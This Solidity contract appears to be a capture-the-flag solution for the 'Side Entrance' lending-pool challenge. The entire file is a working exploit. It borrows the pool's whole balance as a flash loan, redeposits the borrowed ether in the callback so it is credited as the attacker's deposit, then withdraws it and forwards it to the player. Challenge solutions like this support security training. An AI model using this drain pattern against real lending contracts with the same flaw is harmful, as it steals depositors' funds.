// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPool {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}

contract SideEntranceSolution {

    IPool immutable pool;
    address immutable player;

    constructor(address _pool) {
        pool = IPool(_pool);
        player = msg.sender;
    }

    function attack() external returns (bool) {
        require (msg.sender == address(player));

        pool.flashLoan(address(pool).balance);
        pool.withdraw();

        (bool success, ) = player.call{value: address(this).balance}("");
        return success;
    }

    function execute() external payable {
        require (msg.sender == address(pool));
        require (tx.origin == player);
        
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
    
}
